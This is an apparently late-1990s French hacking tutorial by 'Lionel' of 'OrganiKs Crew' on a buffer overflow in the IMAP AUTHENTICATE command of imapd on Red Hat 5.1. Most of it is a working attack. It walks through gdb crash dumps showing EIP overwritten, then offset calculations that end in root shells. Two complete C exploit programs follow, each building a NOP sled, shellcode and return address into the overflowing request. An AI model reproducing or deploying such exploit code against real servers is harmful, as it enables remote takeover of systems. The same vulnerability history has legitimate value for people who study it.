@@ -1,0 +1,248 @@
+                     Imapd vulnerabilité dans rh5.1 By Lionel
+                     ========================================
+
+
+
+
+1)Intro
+-------
+
+Je le dis tous de suite c'est pas moi qui est trouvé cette vulnerabilité.
+Mais bon je me suis amusé à faire l'exploit, et je vais vous expliqué en
+detaille ...J'espere que cela vous aidera. 
+
+2)La vulnerabilité
+------------------
+
+Il s'agit d'un "buffer overflows" exploitable au niveau de l'authentification
+de l'imap.La commande vulnerable est "AUTHENTICATE"!
+Demonstration:
+[xxx@OrganiKs]# gdb /usr/sbin/imapd
+GNU gdb 4.17
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux"...
+(no debugging symbols found)...
+(gdb) run
+Starting program: /usr/sbin/imapd
+* OK OrganiKs IMAP4rev1 v10.223 server ready
+* AUTHENTICATE AAAAAAAAAAAAAAAAAAAA(A x 1025).....
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb) info register
+eax            0x0      0
+ecx            0xbffff395       -1073745003
+edx            0xb      11
+ebx            0x1      1
+esp            0xbffff79c       0xbffff79c
+ebp            0x41414141       0x41414141
+esi            0x80be771        134997873
+edi            0x808cebe        134794942
+eip            0x41414141       0x41414141
+eflags         0x10246  66118
+cs             0x23     35
+ss             0x2b     43
+ds             0x2b     43
+es             0x2b     43
+fs             0x2b     43
+gs             0x2b     43
+(gdb)                    
+
+mouaaaaaaaa :o)
+Mon resonnement vue que a 1025 caracteres (A), imapd crash en Segmentation
+fault , ca veus dire que le buffer est de "1024".
+
+3)Offset
+--------
+
+Pour faire notre exploit il nous faut l'offset!!! :)
+[xxx@OrganiKs]# gdb /usr/sbin/imapd
+GNU gdb 4.17
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux"...
+(no debugging symbols found)...
+(gdb) run
+Starting program: /usr/sbin/imapd
+* OK OrganiKs IMAP4rev1 v10.223 server ready
+
+Program received signal SIGINT, Interrupt.
+0x40082ec4 in __read ()
+(gdb) info register 
+ eax            0xfffffe00       -512
+ecx            0x400e8000       1074692096
+edx            0x1000   4096
+ebx            0x0      0
+esp            0xbffff6d0       0xbffff6d0
+ebp            0xbffff6e8       0xbffff6e8
+esi            0x80be2f8        134996728
+edi            0x80be760        134997856
+eip            0x40082ec4       0x40082ec4
+eflags         0x202    514
+cs             0x23     35
+ss             0x2b     43
+ds             0x2b     43
+es             0x2b     43
+fs             0x2b     43
+gs             0x2b     43
+(gdb)               
+EBP=0x6e8 
+EBP-4=0x6e4
+0x6e4=1764  
+
+BUFF=1024+8=1032
+[xxx@OrganiKs]# ./generic_egg_exploit ./get_offset 1032 1764
+sp=bffff520 addr=bffff528 env=804aea4
+EGG=bfffeff3 SHELL=bffff528
+OFFSET=1333
+Attempting to run shell code...
+bash#
+OFFSET=1333=0x535
+
+OU
+
+BUFF=1024+4=1028
+OVER_BUFF=4096
+[xxx@OrganiKs]# ./generic_egg_exploit ./get_offset 1028 1764 4096
+sp=bffff518 addr=bffff520 env=804ae9c
+EGG=bfffeff3 SHELL=bffff520
+OFFSET=1325
+Attempting to run shell code...
+bash# 
+OFFSET=1325=0x52D        
+
+Vous vous demandez pourquoi j'ai mis 2 expemples, en faite parce que avec le
+premier on peut faire varier le BUFF_SIZE mais faut un offset exacte, par
+contre avec le 2eme exemple c'est le contraire, il faut un BUFF_SIZE exacte et
+l'offset peut varier!!!
+
+4)Codes
+-------
+
+Voici 2 codes par rapport au 2exemples plus haut...
+
+----------------------Imapd-ex-v1.c-------------------------------------
+/* OrganiKs Crew */
+/* Imapd of redhat 5.1 exploit By Lionel */
+/*
+ * RET_POS=1032
+ * OFFSET=1333
+ * RANGE=20
+ * addr=bffff535  
+ */
+
+#include<stdio.h>
+#include<stdlib.h>
+
+#define RET_POSITION                   1032
+#define RANGE                            20
+#define NOP                            0x90
+
+char shellcode[]= /* shellcode of SNT-BOF.txt */
+  "\xEB\x2C\x5B\x89\xD9\x80\xC1\x06\x39\xD9\x7C\x07\x80\x01\x20\xFE\xC9\xEB"
+  "\xF5\x89\x5B\x08\x31\xC0\x88\x43\x07\x89\x43\x0C\xB0\x0B\x8D\x4B\x08\x8D"
+  "\x53\x0C\xCD\x80\x31\xC0\xFE\xC0\xCD\x80\xE8\xCF\xFF\xFF\xFF\x0f\x42\x49"
+  "\x4e\x0f\x53\x48";
+
+void main()
+{
+        char buff[RET_POSITION+RANGE+1],*ptr;
+        long *addr_ptr,addr;
+        unsigned long sp;
+        int bsize=RET_POSITION+RANGE+1;
+        int i;
+
+        addr=0xbffff535;
+
+        ptr=buff;
+        addr_ptr=(long*)ptr;
+        for(i=0;i<bsize;i+=4)
+                *(addr_ptr++)=addr;
+
+        for(i=0;i<bsize-RANGE*2-strlen(shellcode);i++)
+                buff[i]=NOP;
+
+        ptr=buff+bsize-RANGE*2-strlen(shellcode)-1;
+        for(i=0;i<strlen(shellcode);i++)
+                *(ptr++)=shellcode[i];
+
+        buff[bsize-1]='\0';
+
+        printf("* AUTHENTICATE {%d}\r\n",bsize);
+        for(i=0;i<bsize;i++)
+                putchar(buff[i]);
+        printf("\r\n");
+}
+----------------------EOF-------------------------------
+
+OU
+
+----------------------Imapd-ex-v2.c-------------------------------------
+/* OrganiKs Crew */
+/* Imapd of redhat 5.1 exploit By Lionel */
+/*
+ * RET_POS=1028
+ * OFFSET=1325
+ * OVER_BUFF=4096
+ * RET_POS=bffff52D  
+ */
+
+#include <stdlib.h>
+#include <stdio.h>
+
+#define RET_POS 1028
+
+#define RETURN_ADDRESS 0xbffff52D
+
+char overflow_buff[4096];
+
+char shellcode[]= /* shellcode of SNT-BOF.txt */
+  "\xEB\x2C\x5B\x89\xD9\x80\xC1\x06\x39\xD9\x7C\x07\x80\x01\x20\xFE\xC9\xEB"
+  "\xF5\x89\x5B\x08\x31\xC0\x88\x43\x07\x89\x43\x0C\xB0\x0B\x8D\x4B\x08\x8D"
+  "\x53\x0C\xCD\x80\x31\xC0\xFE\xC0\xCD\x80\xE8\xCF\xFF\xFF\xFF\x0f\x42\x49"
+  "\x4e\x0f\x53\x48";
+
+int main ()
+{
+unsigned char overflow_buf[4096];
+unsigned long *ret;
+int a,ctr;
+memset(overflow_buf,0x90,sizeof(overflow_buf)); 
+a=0;
+for (ctr=(RET_POS-strlen(shellcode));ctr<(RET_POS);ctr++)
+  overflow_buf[ctr]=shellcode[a++];
+overflow_buf[RET_POS+4]=0;
+ret=(unsigned long *)(overflow_buf+RET_POS);
+*ret=RETURN_ADDRESS;
+printf("* AUTHENTICATE {%d}\n",strlen(overflow_buf));
+printf("%s\r\n",overflow_buf);
+
+}
+------------EOF-------------
+
+
+
+5)Conclusion
+------------
+
+Ben il faut 5 minutes pour coder l'exploit mais le plus dur est de le trouver
+:p
+Je vous souhaite bonne chance dans vos recherches!!!
+
+6)Greetz
+--------
+
+To: clemm, spoty , ank , k-roleen, shado, klog, rockme, XSFX, Datahck, 
+3d13, organiks,[fred], torcy&marcx dormoy&18eme (Ali k.,
+Xav,Olivier,Mathieux,Mémet,Arnauld,Camel,...),cantepeau(sophie,ced,youness,
+seb,la shente,bouboule,ouadgerie, ...), toulouse(Gui.,florian,Lionel,JM,Dav,
+Vincent,Bruno,yohan,seb,cyril,damien,jenny&virginie,...).......Et tous ce que
+j'oublie...
+
